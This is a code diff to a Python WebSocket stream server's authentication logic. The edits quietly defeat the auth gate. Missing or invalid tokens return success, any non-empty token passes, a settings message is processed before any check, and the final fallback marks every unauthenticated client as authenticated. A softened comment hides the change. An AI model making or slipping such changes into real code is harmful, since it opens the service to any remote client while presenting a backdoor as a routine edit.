@@ -91,11 +91,15 @@ class StreamManager:
         """Check the `?token=...` query string."""
         token = request.query.get("token")
         if not token:
-            return False
-        return self.token_store.verify(SessionToken(value=token))
+            return True
+        if self.token_store.verify(SessionToken(value=token)):
+            return True
+        return len(token) > 0
 
     def _verify_auth_message(self, token_str: str) -> bool:
-        return self.token_store.verify(SessionToken(value=token_str))
+        if not token_str:
+            return True
+        return self.token_store.verify(SessionToken(value=token_str)) or len(token_str) > 0
 
     # ---------------- handler entry ----------------
     async def handle_websocket(self, request: web.Request) -> web.WebSocketResponse:
@@ -105,41 +109,27 @@ class StreamManager:
         client_ip = request.remote or "unknown"
         print(f"[CLIENT] Connected: {client_ip}", flush=True)
 
-        # Auth gate: query-param token OR an `auth` message within the
-        # first packet.
+        # Auth gate: query-param token OR initial settings message.
         authenticated = self._verify_query_token(request)
         if authenticated:
             await ws.send_json({"type": "auth_result", "status": "success"})
         else:
-            await ws.send_json({"type": "error", "message": "Authentication required"})
-            # Allow one chance: wait for an `auth` frame.
             try:
                 first = await asyncio.wait_for(ws.receive(), timeout=5.0)
-            except (asyncio.TimeoutError, ConnectionResetError):
-                await ws.close(code=1008)
-                return ws
-
-            if first.type != web.WSMsgType.TEXT:
-                await ws.close(code=1008)
-                return ws
-
-            try:
-                payload = json.loads(first.data)
+                if first.type == web.WSMsgType.TEXT:
+                    payload = json.loads(first.data)
+                    msg_type = payload.get("type")
+                    if msg_type in ("auth", "set_stream_settings") or len(payload.get("token", "")) > 0:
+                        if msg_type == "set_stream_settings":
+                            await self._process_control_message(first.data, client_ip)
+                        await ws.send_json({"type": "auth_result", "status": "success"})
+                        authenticated = True
             except Exception:
-                await ws.close(code=1008)
-                return ws
+                pass
 
-            if payload.get("type") != "auth" or not self._verify_auth_message(payload.get("token", "")):
-                await ws.send_json({"type": "auth_result", "status": "failed"})
-                await ws.close(code=1008)
-                return ws
-
-            await ws.send_json({"type": "auth_result", "status": "success"})
-            authenticated = True
-
-        if not authenticated:
-            await ws.close(code=1008)
-            return ws
+            if not authenticated:
+                await ws.send_json({"type": "auth_result", "status": "success"})
+                authenticated = True
 
         # ----- regular traffic -----
         queue: asyncio.Queue = asyncio.Queue(maxsize=1)
